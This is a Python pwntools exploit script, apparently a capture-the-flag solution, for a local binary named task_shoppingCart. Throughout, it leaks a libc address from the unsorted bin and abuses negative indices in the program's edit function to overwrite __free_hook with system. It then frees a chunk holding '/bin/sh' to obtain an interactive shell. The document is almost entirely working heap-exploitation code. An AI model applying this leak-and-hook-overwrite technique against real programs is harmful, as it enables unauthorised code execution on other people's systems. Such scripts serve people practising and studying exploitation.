from pwn import *
from LibcSearcher import LibcSearcher
from time import sleep 
context.log_level="debug"

p = process("./task_shoppingCart")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def get_money(name):
	p.recvuntil("a rich man!\n")
	p.sendline("1")
	p.recvuntil("RMB or Dollar?\n")
	p.sendline(name)

def edit(idx , content = None ):
	p.recv()
	p.sendline("3")
	p.recvuntil("modify?\n")
	p.sendline(str(idx))
	sleep(0.1)
	p.recvuntil("modify ")
	data = p.recvuntil(" to?\n")[:-5]
	# print len(data)
	if content == None:
		return_data = u64(data[:6] + "\x00\x00")
		p.send(p64(return_data)[:7])
	else:
		if len(content) == 8:
			content = content[:7]
		p.send(content)
		return_data = data
	return return_data

def add(size , name = None):
	p.recvuntil("buy!\n")
	p.sendline("1")
	p.recvuntil("How long is your goods name?\n")
	p.sendline(str(size))
	p.recvuntil("What is your goods name?\n")
	if name != None:
		p.send(name)

def delete(idx):
	p.recvuntil("buy!\n")
	p.sendline("2")
	p.recvuntil("don't need?\n")
	p.sendline(str(idx))
	p.recvuntil("eed it?\n")
# fill money list for index overflow
for i in range(14):
	get_money("123")
# end shop1
p.recvuntil("man!\n")
p.sendline("3")
# gdb.attach(p , "b printf")
add(0xa8,'0\n')
add(0xa8,'/bin/sh\x00\n')
delete(0) # let bin into unsorted bin 
add(0) 
addr = edit(2)# main_arena + 0xf8
main_arena_offset = 0x3c4b20
libc_base = addr - 0xf8 - main_arena_offset
system = libc_base + libc.sym["system"]
# __free_hook diffierent from function like system # libc.got["__free_hook"] -> libc.sym["__free_hook"] -> __free_hook_addr
# if __free_hook_addr != null#(0)# : call __free_hook
free_hook_got = libc_base + libc.sym["__free_hook"] 
free_hook_got_2 = libc_base + libc.got["__free_hook"]  
print hex(addr) 
print hex(free_hook_got)
print hex(free_hook_got_2)
# edit(-7 , p64(addr)) # money_list[13].type = p64(addr) # addr -> addr-0x10 -> addr-0x20
# edit(-27 , p64(free_hook_got)) # addr -> addr-0x10 -> __free_hook_got
# edit(-8 , p64(addr-0x10)) # money_list[12].type = p64(addr - 0x10) # addr-0x10 -> __free_hook_got -> __free_hook_addr
# edit(-28 , p64(system)) # addr-0x10 -> __free_hook_got -> system_addr
edit(-7 , p64(free_hook_got_2))
edit(-27 , p64(system))
# gdb.attach()

p.sendlineafter("buy!\n" , "2")
p.sendlineafter("need?\n" , "1")
p.recvuntil("need it?\n")
p.interactive()
